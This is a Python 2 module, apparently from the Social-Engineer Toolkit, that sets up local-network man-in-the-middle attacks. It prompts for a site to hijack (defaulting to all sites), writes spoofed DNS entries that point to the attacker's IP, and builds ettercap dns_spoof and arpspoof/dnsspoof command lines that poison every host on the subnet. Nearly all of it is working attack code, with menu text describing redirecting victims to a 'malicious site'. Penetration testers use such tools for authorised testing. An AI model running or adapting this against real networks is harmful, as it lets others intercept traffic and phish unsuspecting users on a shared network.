import subprocess
import re
import pexpect
import os
import time
import sys
from src.core.core import *

# Define to use ettercap or dsniff or nothing.
#
# Thanks to sami8007 and trcx for the dsniff addition

definepath=os.getcwd()



# grab config file
config=file("config/set_config", "r").readlines()
# grab our default directory
cwd=os.getcwd()
# set a variable as default to n or no 
ettercapchoice= 'n'
# add dsniffchoice
dsniffchoice = 'n'
for line in config:
        # check for ettercap choice here
        match1=re.search("ETTERCAP=ON",line)
        if match1: 
                print bcolors.YELLOW + "\n[*] ARP Cache Poisoning is set to ON.\n" + bcolors.ENDC
                ettercapchoice='y'

        # check for dsniff choice here
        match2=re.search("DSNIFF=ON", line)
        if match2:
                print bcolors.YELLOW + "\n[*] DSNIFF DNS Poisoning is set to ON.\n" + bcolors.ENDC
                dsniffchoice = 'y'
                ettercapchoice = 'n'

# GRAB CONFIG from SET
fileopen=file("config/set_config", "r").readlines()
for line in fileopen:
        # grab the ettercap interface
        match=re.search("ETTERCAP_INTERFACE=", line)
        if match:
                line=line.rstrip()
                interface=line.split("=")
                interface=interface[1]
                if interface == "NONE":
                        interface=""

        # grab the ettercap path
        etterpath=re.search("ETTERCAP_PATH=", line)
        if etterpath:
                line=line.rstrip()
                path=line.replace("ETTERCAP_PATH=", "")

# if we are using ettercap then get everything ready
if ettercapchoice== 'y':
        fileopen=file("src/program_junk/ipaddr.file","r").readlines()
        for line in fileopen:
            line=line.rstrip()
            ipaddr=line
        if ettercapchoice == 'y':
           try:
                print """   [*] Welcome to the SET Ettercap Integration Menu [*]

   This attack will poison all victims on your local subnet, and redirect them
   when they hit a specific website. The next prompt will ask you which site you
   will want to trigger the DNS redirect on. A simple example of this is if you
   wanted to trigger everyone on your subnet to connect to you when they go to
   browse to www.google.com, the victim would then be redirected to your malicious
   site. You can alternatively poison everyone and everysite by using the wildcard 
   '*' flag.

   IF YOU WANT TO POISON ALL DNS ENTRIES (DEFAULT) JUST HIT ENTER OR *
                """
                print bcolors.RED + "   Example: http://www.google.com\n" + bcolors.ENDC
                dns_spoof=raw_input("   Enter the site to redirect to attack machine (enter for default): ")
                os.chdir(path)
                # small fix for default
                if dns_spoof == "":
                        # set default to * (everything)
                        dns_spoof="*"
                # remove old stale files
                subprocess.Popen("rm etter.dns 1> /dev/null 2> /dev/null", shell=True).wait()
                # prep etter.dns for writing
                filewrite=file("etter.dns", "w")
                # send our information to etter.dns                
                filewrite.write("%s A %s" % (dns_spoof,ipaddr))
                # close the file
                filewrite.close()
                # set bridge variable to nothing
                bridge=""
                # assign -M arp to arp variable
                arp="-M arp"
                # grab input from user
                bridge_q=raw_input("   Do you want to use bridged mode yes or no: ")
                if bridge_q == "y" or bridge_q == "yes":
                        bridge_int=raw_input("   Enter your network interface for the bridge: ")
                        bridge="-B "+str(bridge_int)
                        arp=""
                print bcolors.RED + "   [*] LAUNCHING ETTERCAP DNS_SPOOF ATTACK!" + bcolors.ENDC
                # spawn a child process
                os.chdir(cwd)
                time.sleep(5)
                filewrite=file("src/program_junk/ettercap","w")
                filewrite.write("ettercap -T -q -i %s -P dns_spoof %s %s // //" % (interface,arp,bridge))
                filewrite.close()
                os.chdir(cwd)
           except Exception, error:
                os.chdir(cwd) 
                log(error)
                print bcolors.RED + "An error has occured, printing error: "+str(error) 

# if we are using dsniff
if dsniffchoice == 'y':
        fileopen=file("src/program_junk/ipaddr.file","r").readlines()
        for line in fileopen:
            line=line.rstrip()
            ipaddr=line
        if dsniffchoice == 'y':
           try:
                print """   [*] Welcome to the SET dnsspoof Integration Menu [*]

   This attack will poison all victims on your local subnet, and redirect them
   when they hit a specific website. The next prompt will ask you which site you
   will want to trigger the DNS redirect on. A simple example of this is if you
   wanted to trigger everyone on your subnet to connect to you when they go to
   browse to www.google.com, the victim would then be redirected to your malicious
   site. You can alternatively poison everyone and everysite by using the wildcard 
   '*' flag.

   IF YOU WANT TO POISON ALL DNS ENTRIES (DEFAULT) JUST HIT ENTER OR *
                """
                print bcolors.RED + "   Example: http://www.google.com\n" + bcolors.ENDC
                dns_spoof=raw_input("   Enter the site to redirect to attack machine (enter for default): ")
                #os.chdir(path)
                # small fix for default
                if dns_spoof == "":
                        dns_spoof="*"
                subprocess.Popen("rm src/program_junk/dnsspoof.conf 1> /dev/null 2> /dev/null", shell=True).wait()
                filewrite=file("src/program_junk/dnsspoof.conf", "w")           
                filewrite.write("%s %s" % (ipaddr, dns_spoof))
                filewrite.close()
                print bcolors.RED + "   [*] LAUNCHING DNSSPOOF DNS_SPOOF ATTACK!" + bcolors.ENDC
                # spawn a child process
                os.chdir(cwd)
                # time.sleep(5)
                # grab default gateway, should eventually replace with pynetinfo python module
                gateway = subprocess.Popen("netstat -rn|grep %s|awk '{print $2}'| awk 'NR==2'" % (interface), shell=True, stdout=subprocess.PIPE).communicate()[0]
                # open file for writing
                filewrite=file("src/program_junk/ettercap","w")
                # write the arpspoof / dnsspoof commands to file
                filewrite.write("arpspoof %s | dnsspoof -f src/program_junk/dnsspoof.conf" % (gateway))
                # close the file
                filewrite.close()
                # change back to normal directory
                os.chdir(cwd)
                # this is needed to keep it similar to format above for web gui mode
                pause=raw_input("   Press [return] to begin dsniff.")
           except Exception, error:
                os.chdir(cwd) 
                log(error)
                # print error message
                print bcolors.RED + "   An error has occured, printing error: "+str(error)  + bcolors.ENDC

